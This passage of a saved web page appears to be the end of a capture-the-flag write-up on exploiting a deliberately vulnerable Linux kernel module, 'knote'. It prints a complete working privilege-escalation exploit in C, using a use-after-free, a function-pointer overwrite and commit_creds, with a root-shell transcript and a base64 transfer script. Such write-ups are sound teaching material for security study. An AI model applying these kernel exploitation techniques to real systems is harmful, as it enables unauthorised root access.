lass=3D"line-numbers language-c" tabindex=3D"0"><code class=3D"language-c">=
<span class=3D"token keyword">void</span> <span class=3D"token function">sp=
awn_shell</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken punctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[+] Hello Userland!"</span><span=
 class=3D"token punctuation">)</span><span class=3D"token punctuation">;</s=
pan>
    <span class=3D"token keyword">int</span> uid <span class=3D"token opera=
tor">=3D</span> <span class=3D"token function">getuid</span><span class=3D"=
token punctuation">(</span><span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span>uid <span class=3D"token operator">=3D=3D</span> <span class=3D"=
token number">0</span><span class=3D"token punctuation">)</span>
        <span class=3D"token function">printf</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token string">"[+] UID: %d (root poggers)=
\n"</span><span class=3D"token punctuation">,</span> uid<span class=3D"toke=
n punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">else</span> <span class=3D"token punctuat=
ion">{</span>
        <span class=3D"token function">printf</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token string">"[!] UID: %d (epic fail)\n"=
</span><span class=3D"token punctuation">,</span> uid<span class=3D"token p=
unctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] starting shell"</span><span =
class=3D"token punctuation">)</span><span class=3D"token punctuation">;</sp=
an>
    <span class=3D"token function">system</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"/bin/sh"</span><span class=3D"=
token punctuation">)</span><span class=3D"token punctuation">;</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] quitting exploit"</span><spa=
n class=3D"token punctuation">)</span><span class=3D"token punctuation">;</=
span>
    <span class=3D"token function">exit</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token number">0</span><span class=3D"token punc=
tuation">)</span><span class=3D"token punctuation">;</span> <span class=3D"=
token comment">// avoid ugly segfault</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span></span></code></pre><figcaption>The <=
code>spawn_shell()</code> function which calls /bin/sh from userland</figca=
ption></figure><p>In our exploit we prepared the userland context registers=
, made a fake UAF knote object that would trigger <code>privesc_ctx_swp</co=
de>, and set the addresses for the kernel functions <code>prepare_kernel_cr=
ed</code> and <code>commit_creds</code>. </p><figure class=3D"kg-card kg-co=
de-card"><pre class=3D"line-numbers language-c" tabindex=3D"0"><code class=
=3D"language-c">    <span class=3D"token function">set_ctx_reg</span><span =
class=3D"token punctuation">(</span><span class=3D"token punctuation">)</sp=
an><span class=3D"token punctuation">;</span>

    <span class=3D"token class-name">knote_t</span> payload_knote<span clas=
s=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>data <span class=
=3D"token operator">=3D</span> <span class=3D"token string">"idc3"</span><s=
pan class=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>len <span class=
=3D"token operator">=3D</span> <span class=3D"token number">5</span><span c=
lass=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>encrypt_func <sp=
an class=3D"token operator">=3D</span> <span class=3D"token operator">&amp;=
</span>privesc_ctx_swp<span class=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>decrypt_func <sp=
an class=3D"token operator">=3D</span> <span class=3D"token operator">&amp;=
</span>privesc_ctx_swp<span class=3D"token punctuation">;</span>

    prepare_kernel_cred <span class=3D"token operator">=3D</span> <span cla=
ss=3D"token number">0xffffffff81053c50</span><span class=3D"token punctuati=
on">;</span>
    commit_creds <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0xffffffff81053a30</span><span class=3D"token punctuation">;</=
span>

    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"[*] new knote_t size: %lu\n"</=
span><span class=3D"token punctuation">,</span> <span class=3D"token keywor=
d">sizeof</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken class-name">knote_t</span><span class=3D"token punctuation">)</span><sp=
an class=3D"token punctuation">)</span><span class=3D"token punctuation">;<=
/span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] allocating malicious payload=
 knote"</span><span class=3D"token punctuation">)</span><span class=3D"toke=
n punctuation">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_CREATE<span class=3D"token punctuation">,</span> <sp=
an class=3D"token number">1</span><span class=3D"token punctuation">,</span=
> <span class=3D"token operator">&amp;</span>payload_knote<span class=3D"to=
ken punctuation">,</span> <span class=3D"token number">32</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span></span></code></pre><figcaption>A subsection of the exploit whi=
ch sets the privesc up</figcaption></figure><p>Then, I tested the exploit l=
ocally by compiling it using <code>compress.sh</code> (given earlier in thi=
s post):</p><figure class=3D"kg-card kg-code-card"><pre class=3D"line-numbe=
rs language-bash" tabindex=3D"0"><code class=3D"language-bash">~ $ <span cl=
ass=3D"token function">whoami</span>
user
~ $ /exploit
exploit         exploit_easy    exploit_easy.c  exploit_real.c
~ $ /exploit_easy
<span class=3D"token punctuation">[</span>*<span class=3D"token punctuation=
">]</span> creating note <span class=3D"token number">0</span>: fail pls
ioctl<span class=3D"token punctuation">(</span>fd<span class=3D"token opera=
tor">=3D</span><span class=3D"token number">3</span>, <span class=3D"token =
assign-left variable">cmd</span><span class=3D"token operator">=3D</span>0x=
1337, <span class=3D"token operator">&amp;</span><span class=3D"token assig=
n-left variable">ku</span><span class=3D"token operator">=3D</span>0x7fff3d=
3605c0<span class=3D"token punctuation">)</span> -<span class=3D"token oper=
ator">&gt;</span> <span class=3D"token parameter variable">-1</span>
<span class=3D"token punctuation">[</span>+<span class=3D"token punctuation=
">]</span> CS: 0x33, SS: 0x2b, RSP: 0x7fff3d3605e0, RFLAGS: 0x246
<span class=3D"token punctuation">[</span>*<span class=3D"token punctuation=
">]</span> new knote_t size: <span class=3D"token number">32</span>
<span class=3D"token punctuation">[</span>*<span class=3D"token punctuation=
">]</span> allocating malicious payload knote
ioctl<span class=3D"token punctuation">(</span>fd<span class=3D"token opera=
tor">=3D</span><span class=3D"token number">3</span>, <span class=3D"token =
assign-left variable">cmd</span><span class=3D"token operator">=3D</span>0x=
1337, <span class=3D"token operator">&amp;</span><span class=3D"token assig=
n-left variable">ku</span><span class=3D"token operator">=3D</span>0x7fff3d=
3605c0<span class=3D"token punctuation">)</span> -<span class=3D"token oper=
ator">&gt;</span> <span class=3D"token number">0</span>
<span class=3D"token punctuation">[</span>*<span class=3D"token punctuation=
">]</span> calling <span class=3D"token punctuation">(</span>hopefully over=
writed<span class=3D"token punctuation">)</span> encrypt <span class=3D"tok=
en keyword">function</span>
<span class=3D"token punctuation">[</span>+<span class=3D"token punctuation=
">]</span> Hello Userland<span class=3D"token operator">!</span>
<span class=3D"token punctuation">[</span>+<span class=3D"token punctuation=
">]</span> <span class=3D"token environment constant">UID</span><span class=
=3D"token builtin class-name">:</span> <span class=3D"token number">0</span=
> <span class=3D"token punctuation">(</span>root poggers<span class=3D"toke=
n punctuation">)</span>
<span class=3D"token punctuation">[</span>*<span class=3D"token punctuation=
">]</span> starting shell
/bin/sh: can't access <span class=3D"token function">tty</span><span class=
=3D"token punctuation">;</span> job control turned off
/home/user <span class=3D"token comment"># whoami</span>
root
/home/user <span class=3D"token comment">#</span><span aria-hidden=3D"true"=
 class=3D"line-numbers-rows"><span></span><span></span><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span></span></code></pre><fig=
caption>Exploit proof-of-concept (PoC)</figcaption></figure><p>If you want =
to try the exploit yourself, here's the complete source code for <code>expl=
oit.c</code>:</p><figure class=3D"kg-card kg-code-card"><pre class=3D"line-=
numbers language-c" tabindex=3D"0"><code class=3D"language-c"><span class=
=3D"token macro property"><span class=3D"token directive-hash">#</span><spa=
n class=3D"token directive keyword">include</span> <span class=3D"token str=
ing">&lt;stdlib.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;stdio.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;fcntl.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;sys/ioctl.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;sys/xattr.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;unistd.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">"kpwn.c"</span></span>


<span class=3D"token keyword">int</span> FD_KNOTE<span class=3D"token punct=
uation">;</span>

<span class=3D"token keyword">enum</span> <span class=3D"token class-name">=
knote_ioctl_cmd</span> <span class=3D"token punctuation">{</span>
    KNOTE_CREATE <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0x1337</span><span class=3D"token punctuation">,</span>
    KNOTE_DELETE <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0x1338</span><span class=3D"token punctuation">,</span>
    KNOTE_READ <span class=3D"token operator">=3D</span> <span class=3D"tok=
en number">0x1339</span><span class=3D"token punctuation">,</span>
    KNOTE_ENCRYPT <span class=3D"token operator">=3D</span> <span class=3D"=
token number">0x133a</span><span class=3D"token punctuation">,</span>
    KNOTE_DECRYPT <span class=3D"token operator">=3D</span> <span class=3D"=
token number">0x133b</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">unsigned</span> <span class=3D"token keyw=
ord">long</span> idx<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span> data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_user_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span>data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>encrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>decrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">void</span> <span class=3D"token function">cm=
d_send</span><span class=3D"token punctuation">(</span><span class=3D"token=
 keyword">unsigned</span> <span class=3D"token keyword">long</span> cmd<spa=
n class=3D"token punctuation">,</span> <span class=3D"token keyword">unsign=
ed</span> <span class=3D"token keyword">long</span> idx<span class=3D"token=
 punctuation">,</span> <span class=3D"token keyword">char</span><span class=
=3D"token operator">*</span> data<span class=3D"token punctuation">,</span>=
 <span class=3D"token class-name">size_t</span> len<span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token class-name">knote_user_t</span> user<span class=3D=
"token punctuation">;</span>
    user<span class=3D"token punctuation">.</span>idx <span class=3D"token =
operator">=3D</span> idx<span class=3D"token punctuation">;</span>
    user<span class=3D"token punctuation">.</span>data <span class=3D"token=
 operator">=3D</span> data<span class=3D"token punctuation">;</span>
    user<span class=3D"token punctuation">.</span>len <span class=3D"token =
operator">=3D</span> len<span class=3D"token punctuation">;</span>

    <span class=3D"token keyword">int</span> retv <span class=3D"token oper=
ator">=3D</span> <span class=3D"token function">ioctl</span><span class=3D"=
token punctuation">(</span>FD_KNOTE<span class=3D"token punctuation">,</spa=
n> cmd<span class=3D"token punctuation">,</span> <span class=3D"token opera=
tor">&amp;</span>user<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"ioctl(fd=3D%d, cmd=3D0x%x, &am=
p;ku=3D%p) -&gt; %d\n"</span><span class=3D"token punctuation">,</span> FD_=
KNOTE<span class=3D"token punctuation">,</span> cmd<span class=3D"token pun=
ctuation">,</span> <span class=3D"token operator">&amp;</span>user<span cla=
ss=3D"token punctuation">,</span> retv<span class=3D"token punctuation">)</=
span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">ma=
in</span><span class=3D"token punctuation">(</span><span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
    FD_KNOTE <span class=3D"token operator">=3D</span> <span class=3D"token=
 function">open</span><span class=3D"token punctuation">(</span><span class=
=3D"token string">"/dev/knote"</span><span class=3D"token punctuation">,</s=
pan> O_RDONLY<span class=3D"token punctuation">)</span><span class=3D"token=
 punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span>FD_KNOTE <span class=3D"token operator">&lt;</span> <span class=
=3D"token number">0</span><span class=3D"token punctuation">)</span>
    <span class=3D"token punctuation">{</span>
        <span class=3D"token function">puts</span><span class=3D"token punc=
tuation">(</span><span class=3D"token string">"main(): open failed"</span><=
span class=3D"token punctuation">)</span><span class=3D"token punctuation">=
;</span>
        <span class=3D"token function">exit</span><span class=3D"token punc=
tuation">(</span><span class=3D"token number">1</span><span class=3D"token =
punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>

    <span class=3D"token comment">/* case KNOTE_CREATE:
     *     char *data =3D kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] =3D kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data =3D data;
     *     knotes[ku.idx]-&gt;len =3D len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len))=20
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func =3D knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func =3D knote_decrypt;
     *
     * doesn't reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] creating note 0: fail pls"</=
span><span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_CREATE<span class=3D"token punctuation">,</span> <sp=
an class=3D"token number">0</span><span class=3D"token punctuation">,</span=
> <span class=3D"token punctuation">(</span><span class=3D"token keyword">v=
oid</span><span class=3D"token operator">*</span><span class=3D"token punct=
uation">)</span><span class=3D"token number">0x1337</span><span class=3D"to=
ken punctuation">,</span> <span class=3D"token number">32</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
=20
    <span class=3D"token function">set_ctx_reg</span><span class=3D"token p=
unctuation">(</span><span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>

    <span class=3D"token class-name">knote_t</span> payload_knote<span clas=
s=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>data <span class=
=3D"token operator">=3D</span> <span class=3D"token string">"idc3"</span><s=
pan class=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>len <span class=
=3D"token operator">=3D</span> <span class=3D"token number">5</span><span c=
lass=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>encrypt_func <sp=
an class=3D"token operator">=3D</span> <span class=3D"token operator">&amp;=
</span>privesc_ctx_swp<span class=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>decrypt_func <sp=
an class=3D"token operator">=3D</span> <span class=3D"token operator">&amp;=
</span>privesc_ctx_swp<span class=3D"token punctuation">;</span>

    prepare_kernel_cred <span class=3D"token operator">=3D</span> <span cla=
ss=3D"token number">0xffffffff81053c50</span><span class=3D"token punctuati=
on">;</span>
    commit_creds <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0xffffffff81053a30</span><span class=3D"token punctuation">;</=
span>

    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"[*] new knote_t size: %lu\n"</=
span><span class=3D"token punctuation">,</span> <span class=3D"token keywor=
d">sizeof</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken class-name">knote_t</span><span class=3D"token punctuation">)</span><sp=
an class=3D"token punctuation">)</span><span class=3D"token punctuation">;<=
/span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] allocating malicious payload=
 knote"</span><span class=3D"token punctuation">)</span><span class=3D"toke=
n punctuation">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_CREATE<span class=3D"token punctuation">,</span> <sp=
an class=3D"token number">1</span><span class=3D"token punctuation">,</span=
> <span class=3D"token operator">&amp;</span>payload_knote<span class=3D"to=
ken punctuation">,</span> <span class=3D"token number">32</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
   =20
    <span class=3D"token comment">/* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;=3D 10 || !knotes[ku.idx])=20
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[=
ku.idx]-&gt;len);
     *=20
     * trigger function call to encrypt_fun
     */</span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] calling (hopefully overwrite=
d) encrypt function"</span><span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_ENCRYPT<span class=3D"token punctuation">,</span> <s=
pan class=3D"token number">0</span><span class=3D"token punctuation">,</spa=
n> <span class=3D"token string">"idc4"</span><span class=3D"token punctuati=
on">,</span> <span class=3D"token number">5</span><span class=3D"token punc=
tuation">)</span><span class=3D"token punctuation">;</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[-] exploit failed :("</span><sp=
an class=3D"token punctuation">)</span><span class=3D"token punctuation">;<=
/span>
<span class=3D"token punctuation">}</span><span aria-hidden=3D"true" class=
=3D"line-numbers-rows"><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span><span></span><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span><span></span><span></span><span></span><span>=
</span><span></span><span></span><span></span><span></span><span></span><sp=
an></span><span></span><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span><span></span><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span></span></co=
de></pre><figcaption>Complete <code>exploit.c</code></figcaption></figure><=
p>Now it's time to perform the exploit on the remote machine. I wisely chos=
e <code>musl-gcc</code> as the compiler in <code>compress.sh</code> since i=
t decreases the size of static builds A LOT. The static binary sizes from <=
code>gcc</code> and <code>musl-gcc</code> are respectfully <code>800000</co=
de> bytes and <code>34000</code> bytes. In order to transfer the exploit to=
 the remote machine, I used <code>encode.sh</code> to encode the exploit bi=
nary, <strong>copy it to clipboard</strong> and decoded it using BASH utili=
ties on the remote machine:</p><figure class=3D"kg-card kg-code-card"><pre =
class=3D"line-numbers language-bash" tabindex=3D"0"><code class=3D"language=
-bash"><span class=3D"token function">tar</span> <span class=3D"token param=
eter variable">-czO</span> <span class=3D"token variable">$1</span> <span c=
lass=3D"token operator">|</span> base64 <span class=3D"token parameter vari=
able">-w160</span>


<span class=3D"token builtin class-name">echo</span> <span class=3D"token s=
tring">"<span class=3D"token entity" title=3D"\n">\n</span><span class=3D"t=
oken entity" title=3D"\n">\n</span>=3D=3D=3D=3D=3D TO DECODE =3D=3D=3D=3D=
=3D"</span> <span class=3D"token operator">&gt;</span> /dev/stderr
<span class=3D"token builtin class-name">echo</span> <span class=3D"token s=
tring">"echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit"</span> <span =
class=3D"token operator">&gt;</span> /dev/stderr
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span></span></code></pre><figcaptio=
n>The <code>encode.sh</code> used to transfer files from local machine to t=
he remote CTF box</figcaption></figure><figure class=3D"kg-card kg-code-car=
d"><pre class=3D"line-numbers language-bash" tabindex=3D"0"><code class=3D"=
language-bash">$ encode.sh initramfs/exploit <span class=3D"token operator"=
>|</span> xsel <span class=3D"token parameter variable">-b</span>


<span class=3D"token operator">=3D=3D</span><span class=3D"token operator">=
=3D=3D</span><span class=3D"token operator">=3D</span> TO DECODE <span clas=
s=3D"token operator">=3D=3D</span><span class=3D"token operator">=3D=3D</sp=
an><span class=3D"token operator">=3D</span>
<span class=3D"token builtin class-name">echo</span> <span class=3D"token o=
perator">&lt;</span><span class=3D"token punctuation">..</span>.<span class=
=3D"token operator">&gt;</span> <span class=3D"token operator">|</span> bas=
e64 <span class=3D"token parameter variable">-d</span> <span class=3D"token=
 operator">|</span> <span class=3D"token function">tar</span> <span class=
=3D"token parameter variable">-xzO</span> <span class=3D"token operator">&g=
t;</span> exploit<span aria-hidden=3D"true" class=3D"line-numbers-rows"><sp=
an></span><span></span><span></span><span></span><span></span></span></code=
></pre><figcaption>Proof-of-concept of <code>encode.sh</code> to encode the=
 binary</figcaption></figure><h2 id=3D"afterword">Afterword</h2><p>I really=
 hope you enjoyed the challenge and write-up as much as I did. Please let m=
e know on <a href=3D"https://twitter.com/notselwyn">Twitter</a> if you want=
 me to make a write-up about exploiting this CTF with <em>real</em> kernel =
primitives like <code>seq_operations</code> and <code>setxattr</code>. </p>=
<p>If you like this pwn content, please checkout the <a href=3D"https://pwn=
ing.tech/blacksmith/">HackTheBox - Blacksmith</a> write-up, or checkout the=
 <a href=3D"https://pwning.tech/tag/heap-memory">Heap Memory</a> and <a hre=
f=3D"https://pwning.tech/tag/linux-kernel/">Linux Kernel </a>tag pages on t=
he site to read more kernel related blogposts. </p>
</section>
</article>
</main>
<aside class=3D"read-more-wrap outer">
<div class=3D"read-more inner">
<article class=3D"post-card post no-image">
<div class=3D"post-card-content">
<a class=3D"post-card-content-link" href=3D"https://pwning.tech/cve-2022-47=
758/">
<header class=3D"post-card-header">
<div class=3D"post-card-tags">
</div>
<h2 class=3D"post-card-title">
How I hacked smart lights: the story behind CVE-2022-47758
</h2>
</header>
<div class=3D"post-card-excerpt">In this blogpost, we take a closer look at=
 our research regarding CVE-2022-47758: a critical vulnerability impacting =
a very large number of Internet of Things smart devices. We could leverage =
this vulnerability in the lamp's firmware for unauthenticated remote code e=
xecution on the entire device with the highest privileges and</div>
</a>
<footer class=3D"post-card-meta">
<time class=3D"post-card-meta-date" datetime=3D"2023-03-08">Mar 8, 2023</ti=
me>
<span class=3D"post-card-meta-length">16 min read</span>
</footer>
</div>
</article>
<article class=3D"post-card post no-image">
<div class=3D"post-card-content">
<a class=3D"post-card-content-link" href=3D"https://pwning.tech/cve-2022-46=
640/">
<header class=3D"post-card-header">
<div class=3D"post-card-tags">
</div>
<h2 class=3D"post-card-title">
How I hacked IoT management apps: the story behind CVE-2022-46640
</h2>
</header>
<div class=3D"post-card-excerpt">Have you ever wondered how secure desktop =
applications really are? Recently, we put one of them to the test and found=
 some critical vulnerabilities such as unauthenticated Remote Code Executio=
n (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguratio=
n which allowed us to remotely compromise the Windows desktop. In this blog=
post,</div>
</a>
<footer class=3D"post-card-meta">
<time class=3D"post-card-meta-date" datetime=3D"2023-03-08">Mar 8, 2023</ti=
me>
<span class=3D"post-card-meta-length">8 min read</span>
</footer>
</div>
</article>
<article class=3D"post-card post featured no-image">
<div class=3D"post-card-content">
<a class=3D"post-card-content-link" href=3D"https://pwning.tech/superfast/"=
>
<header class=3D"post-card-header">
<div class=3D"post-card-tags">
<span class=3D"post-card-featured"><svg width=3D"16" height=3D"17" viewBox=
=3D"0 0 16 17" fill=3D"none" xmlns=3D"http://www.w3.org/2000/svg">
<path d=3D"M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002=
C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14=
.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778=
 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.=
68127L6.99365 6.25002L4.49365 4.58752Z" stroke=3D"currentColor" stroke-widt=
h=3D"2" stroke-linecap=3D"round" stroke-linejoin=3D"round"></path>
</svg> Featured</span>
</div>
<h2 class=3D"post-card-title">
Superfast (HackTheBox)
</h2>
</header>
<div class=3D"post-card-excerpt">Hey folks. In this write-up, we're going t=
o discuss the Superfast challenge in HackTheBox which was part of the HackT=
heBox Business CTF 2022. We're going to perform a single-byte overwrite to =
bypass ASLR, leak stack pointers, and perform a Return Oriented Programming=
 (ROP) chain. The description of the challenge is:</div>
</a>
<footer class=3D"post-card-meta">
<time class=3D"post-card-meta-date" datetime=3D"2022-11-28">Nov 28, 2022</t=
ime>
<span class=3D"post-card-meta-length">10 min read</span>
</footer>
</div>
</article>
</div>
</aside>
</div>
<footer class=3D"site-footer outer">
<div class=3D"inner">
<section class=3D"copyright"><a href=3D"https://pwning.tech/">Pwning Tech</=
a> =C2=A9 2023</section>
<nav class=3D"site-footer-nav">
<ul class=3D"nav">
<li class=3D"nav-sign-up"><a href=3D"https://pwning.tech/knote/#/portal/">S=
ign up</a></li>
</ul>
</nav>
<div><a href=3D"https://ghost.org/" target=3D"_blank" rel=3D"noopener">Powe=
red by Ghost</a></div>
</div>
</footer>
</div>
















<div id=3D"rememberry__extension__root" style=3D"all: unset;"><template sha=
dowmode=3D"open"><main data-reactroot=3D""><!-- react-empty: 2 --></main></=
template></div><div id=3D"sodo-search-root"></div></body></html>
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: cid:css-504f126c-c959-4a59-bab5-b7ab07b9b2b6@mhtml.blink

@charset "utf-8";

:root { --ghost-accent-color: #e01b24; }
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: cid:css-d1c0d010-b8ca-4364-8f78-7e0af6aa9564@mhtml.blink

@charset "utf-8";

@font-face { font-family: rbicon; src: url("chrome-extension://dipiagiiohfl=
jcicegpgffpbnjmgjcnf/fonts/rbicon.woff2") format("woff2"); font-weight: nor=
mal; font-style: normal; }
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: cid:css-7af403b0-5a3a-48fc-ba6a-cc39d7008354@mhtml.blink

@charset "utf-8";

.App { text-align: center; }

.App-logo { height: 40vmin; pointer-events: none; }

@media (prefers-reduced-motion: no-preference) {
  .App-logo { animation: 20s linear 0s infinite normal none running App-log=
o-spin; }
}

